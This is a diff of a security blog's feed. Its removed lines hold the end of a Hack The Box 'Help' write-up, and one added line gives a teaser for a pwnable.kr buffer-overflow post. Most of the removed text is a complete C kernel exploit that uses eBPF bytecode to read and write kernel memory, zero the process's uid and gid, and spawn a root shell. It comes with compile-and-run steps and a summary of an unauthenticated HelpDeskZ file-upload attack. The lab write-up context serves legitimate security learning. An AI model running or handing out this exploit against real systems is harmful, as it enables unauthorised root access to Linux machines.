-		&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;
-		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
-		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
-		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
-		&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;
-		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
-		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
-		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
-		&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;
-		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
-		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
-		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;
-		&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;
-		&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;;
-
-char bpf_log_buf[LOG_BUF_SIZE];
-
-static int bpf_prog_load(enum bpf_prog_type prog_type,
-		  const struct bpf_insn *insns, int prog_len,
-		  const char *license, int kern_version) {
-	union bpf_attr attr = {
-		.prog_type = prog_type,
-		.insns = (__u64)insns,
-		.insn_cnt = prog_len / sizeof(struct bpf_insn),
-		.license = (__u64)license,
-		.log_buf = (__u64)bpf_log_buf,
-		.log_size = LOG_BUF_SIZE,
-		.log_level = 1,
-	};
-
-	attr.kern_version = kern_version;
-
-	bpf_log_buf[0] = 0;
-
-	return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;amp;attr, sizeof(attr));
-}
-
-static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
-		   int max_entries) {
-	union bpf_attr attr = {
-		.map_type = map_type,
-		.key_size = key_size,
-		.value_size = value_size,
-		.max_entries = max_entries
-	};
-
-	return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;amp;attr, sizeof(attr));
-}
-
-static int bpf_update_elem(uint64_t key, uint64_t value) {
-	union bpf_attr attr = {
-		.map_fd = mapfd,
-		.key = (__u64)&amp;amp;key,
-		.value = (__u64)&amp;amp;value,
-		.flags = 0,
-	};
-
-	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;amp;attr, sizeof(attr));
-}
-
-static int bpf_lookup_elem(void *key, void *value) {
-	union bpf_attr attr = {
-		.map_fd = mapfd,
-		.key = (__u64)key,
-		.value = (__u64)value,
-	};
-
-	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;amp;attr, sizeof(attr));
-}
-
-static void __exit(char *err) {
-	fprintf(stderr, &quot;error: %s\n&quot;, err);
-	exit(-1);
-}
-
-static void prep(void) {
-	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
-	if (mapfd &amp;lt; 0)
-		__exit(strerror(errno));
-
-	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
-			(struct bpf_insn *)__prog, PROGSIZE, &quot;GPL&quot;, 0);
-
-	if (progfd &amp;lt; 0)
-		__exit(strerror(errno));
-
-	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
-		__exit(strerror(errno));
-
-	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;amp;progfd, sizeof(progfd)) &amp;lt; 0)
-		__exit(strerror(errno));
-}
-
-static void writemsg(void) {
-	char buffer[64];
-
-	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
-
-	if (n &amp;lt; 0) {
-		perror(&quot;write&quot;);
-		return;
-	}
-	if (n != sizeof(buffer))
-		fprintf(stderr, &quot;short write: %lu\n&quot;, n);
-}
-
-#define __update_elem(a, b, c) \
-	bpf_update_elem(0, (a)); \
-	bpf_update_elem(1, (b)); \
-	bpf_update_elem(2, (c)); \
-	writemsg();
-
-static uint64_t get_value(int key) {
-	uint64_t value;
-
-	if (bpf_lookup_elem(&amp;amp;key, &amp;amp;value))
-		__exit(strerror(errno));
-
-	return value;
-}
-
-static uint64_t __get_fp(void) {
-	__update_elem(1, 0, 0);
-
-	return get_value(2);
-}
-
-static uint64_t __read(uint64_t addr) {
-	__update_elem(0, addr, 0);
-
-	return get_value(2);
-}
-
-static void __write(uint64_t addr, uint64_t val) {
-	__update_elem(2, addr, val);
-}
-
-static uint64_t get_sp(uint64_t addr) {
-	return addr &amp;amp; ~(0x4000 - 1);
-}
-
-static void pwn(void) {
-	uint64_t fp, sp, task_struct, credptr, uidptr;
-
-	fp = __get_fp();
-	if (fp &amp;lt; PHYS_OFFSET)
-		__exit(&quot;bogus fp&quot;);
-	
-	sp = get_sp(fp);
-	if (sp &amp;lt; PHYS_OFFSET)
-		__exit(&quot;bogus sp&quot;);
-	
-	task_struct = __read(sp);
-
-	if (task_struct &amp;lt; PHYS_OFFSET)
-		__exit(&quot;bogus task ptr&quot;);
-
-	printf(&quot;task_struct = %lx\n&quot;, task_struct);
-
-	credptr = __read(task_struct + CRED_OFFSET); // cred
-
-	if (credptr &amp;lt; PHYS_OFFSET)
-		__exit(&quot;bogus cred ptr&quot;);
-
-	uidptr = credptr + UID_OFFSET; // uid
-	if (uidptr &amp;lt; PHYS_OFFSET)
-		__exit(&quot;bogus uid ptr&quot;);
-
-	printf(&quot;uidptr = %lx\n&quot;, uidptr);
-	__write(uidptr, 0); // set both uid and gid to 0
-
-	if (getuid() == 0) {
-		printf(&quot;spawning root shell\n&quot;);
-		system(&quot;/bin/bash&quot;);
-		exit(0);
-	}
-
-	__exit(&quot;not vulnerable?&quot;);
-}
-
-int main(int argc, char **argv) {
-	prep();
-	pwn();
-
-	return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;i-ran-a-python-server-to-host-the-exploit-then-i-downloaded-it-on-the-box-&quot;&gt;I ran a python server to host the exploit then I downloaded it on the box :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-i-compiled-the-exploit-and-ran-it-&quot;&gt;Then I compiled the exploit and ran it :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o exploit exploit.c&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/help/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---sizzle&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/sizzle/&quot;&gt;Hack The Box - Sizzle&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - FluJab&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="Python" /><category term="code analysis" /><summary type="html">Quick Summary Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called HelpDeskZ. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is 10.10.10.121 I added it to /etc/hosts as help.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC help.htb We got ssh on port 22 and http on two ports : 80 and 3000. What’s running on port 80 is an Apache2 server and on port 3000 is Node.js Express Framework. HTTP Initial Enumeration On port 80 there’s just the default Apache index page : So I ran gobuster and got these results : gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://help.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/06/07 13:03:25 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /support (Status: 301) ===================================================== 2019/06/07 13:05:25 Finished ===================================================== I went to /support and there was a web application called HelpDeskZ : File Upload Vulnerability A quick search and I found an unauthenticated file upload vulnerability that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload php files because they are allowed by default.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/help/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Binary Exploitation" /><category term="Buffer Overflow" /><category term="code analysis" /><category term="Exploit Development" /><category term="c" /><category term="Python" /><summary type="html">Introduction Hey guys it’s been a long time since my first pwn write-up, today I’ll write about another challenge from pwnable.kr called bof. It was a simple easy buffer overflow challenge (You can also check these), by overwriting a variable we can get a shell. I’ll also write a small exploit with pwntools that spawns a shell automatically. Challenge Description ``` Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/pwn/bof/0.png" /></entry></feed>
